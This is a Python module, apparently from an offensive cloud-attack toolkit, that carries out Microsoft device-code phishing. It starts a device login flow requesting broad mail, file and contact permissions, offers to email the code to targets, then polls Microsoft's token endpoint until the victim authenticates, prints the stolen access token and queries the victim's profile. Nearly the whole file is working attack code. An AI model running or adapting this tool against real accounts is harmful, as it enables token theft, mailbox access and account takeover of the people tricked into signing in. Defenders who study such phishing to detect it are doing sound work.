import msal
import json
import sys
import requests

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = False

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "RESOURCE": {
        "value": "https://graph.windows.net",
        "required": "true",
        "description": "Resource URL"
    },
    "TENANT": {
        "value": "https://graph.windows.net",
        "required": "true",
        "description": "Resource URL"
    },
    "CLIENT-ID": {
        #"value": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        #"value": "1950a258-227b-4e31-a9cf-717495945fc2",
        #"value": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "value": "",
        "required": "true",
        "description": "The Application Client-ID"
    },
    "CLIENT-SECRET": {
        "value": "false",
        "required": "true",
        "description": "The client secret."
    },
    "SEND-EMAIL": {
        "value": "false",
        "required": "true",
        "description": "Make this true if you want to automatically send email to the below emails, or false to just get the code."
    },
    "TARGET-EMAIL-WORDLIST": {
        "value": "",
        "required": "false",
        "description": "The keywords to check for on emails"
    },
    "REFRESH": {
        "value": "false",
        "required": "true",
        "description": "The keywords to check for on emails"
    },
    "DEVICE-CODE": {
        "value": "",
        "required": "false",
        "description": "Only add this if you are using REFRESH"
    },
    "AUTHORITY": {
        "value": "https://login.microsoftonline.com/organizations",
        "required": "true",
        "description": "Only add this if you are using REFRESH"
    },
    "SCOPE": {
        "value": "Contacts.Read,Files.ReadWrite.All,Mail.Read,Mail.Send,MailboxSettings.ReadWrite,Notes.Read.All,User.Read,User.ReadBasic.All,offline_access,openid,profile",
        "required": "true",
        "description": ""
    }
}

flow = None

description = ""

aws_command = "No awscli command"

def exploit(workspace):
    device_code_request = {}
    resource = variables['RESOURCE']['value']
    client_id = variables['CLIENT-ID']['value']
    client_secret = variables['CLIENT-SECRET']['value']
    send_mail = variables['SEND-EMAIL']['value']
    target_email_wordlist = variables['TARGET-EMAIL-WORDLIST']['value']
    refresh = variables['REFRESH']['value']
    tenant = variables['TENANT']['value']
    authority = variables['AUTHORITY']['value']
    scope = (variables['SCOPE']['value']).split(",")
    flow = None
    app = None



    if not tenant == "":
        authority_host_uri = 'https://login.microsoftonline.com/{}'.format(tenant)
    else:
        authority_host_uri = 'https://login.microsoftonline.com/common'

    if refresh.lower().strip().replace("\n", "") == 'false':
        try:
            app = msal.PublicClientApplication(
                client_id,
                authority=authority_host_uri,
                #client_credential=client_secret
            )

            result = None

            flow = app.initiate_device_flow(
                scopes=scope,
                #client_id=client_id
            )
            if not "user_code" in flow:
                return {
                    "error": "Fail to create device flow. Err: %s" % json.dumps(flow, indent=4)
                }, 500

            flow['instructions'] = "Run this module periodically with REFRESH set to True to get the tokens."

            return {
                       "user_code": flow
                   }, 200

        except:
            return {"error": str(sys.exc_info())}, 500

    else:
        if variables['DEVICE-CODE']['value'] == "":
            return {"error": "[*] Please add the DEVICE-CODE."}, 500
        else:
            device_code = variables['DEVICE-CODE']['value']

        token_request = requests.post(
            "https://login.microsoftonline.com/{}/oauth2/token?api-version=1.0".format(tenant),
            #"https://login.microsoftonline.com/{}/oauth2/token?api-version=1.0".format(tenant),
            data={
                "client_id": client_id,
                "resource": resource,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "code": device_code
            }
            #data=tokenrequestbody
        )

        if token_request.status_code == 400:
            print(token_request.text)
            return {"device_code": {
                        "message": "Still no authentication done by the target",
                        "device_code": device_code
                }}

        elif token_request.status_code == 200:
            returned_request = token_request.json()
            returned_request['device_code'] = device_code
            access_token = returned_request['access_token']
            print(access_token)

            try:
                me = (requests.get("https://graph.microsoft.com/v1.0/me",
                               headers={
                                    'Content-Type': 'application/json',
                                    'Authorization': 'Bearer {}'.format(access_token)
                                }).text)

            except:
                me = "No Privs to check user's info"

            return {
                    "device_code": {
                    "token": returned_request,
                    "device_code": device_code,
                    "user_info": me
                }
            }

















'''        
        try:
            #if not flow == None or not app == None:
            result = app.acquire_token_by_device_flow(flow)

            if "access_token" in result:
                result['login_type'] = 'Device Authentication'
                return {
                    'login_type': result
                }, 200
            else:
                result['login_type'] = 'Device Authentication'
                return {
                           'login_type': result
                       }, 200
            #else:
            #    return {"error": "[*] Have you generated a request?"}
        except:
            return {"error": str(sys.exc_info())}, 500
'''